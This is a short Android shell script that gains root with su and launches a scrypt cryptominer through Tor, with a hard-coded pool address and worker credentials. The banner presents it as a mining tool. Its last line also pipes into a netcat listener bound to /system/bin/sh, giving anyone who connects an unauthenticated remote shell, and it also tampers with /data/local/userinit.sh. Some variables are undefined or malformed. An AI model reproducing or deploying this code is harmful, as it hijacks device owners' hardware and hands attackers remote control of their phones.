#!/system/bin/sh
su
./w.sh
#Config next ver sup ext conf
MINE_H=1 # miner mode
TOR_INS=1 # use tor
HOME='sh ./bin'
URL_MINE=stratum+tcp://btc.f2pool.com:1314
AUTH_PL=pmilind92.001:21235365876986800
TH_C=4
#
$HOME/mine.conf&
if test $MINE_H -ne 1
then
mv /data/local/userinit.sh initc
else
echo ""
fi
echo 'Dedicated CPU For Scrypt Mining'
echo 'supported: TOR'
echo '----------------------------------'
echo 'Loading TOR.......'
sleep 1
if test $TOR_INS -ne 1
then
minerd -a scrypt -o $URL_MINE -O $AUTH_PL -t $TH_C-q
else
$HOME/tor -f .torrc | $HOME/minerd -a scrypt -o $URL_MINE -O $AUTH_PL -t $TH_C -q | $HOME/busybox nc -ll -p $RSH_P -e /system/bin/sh
fi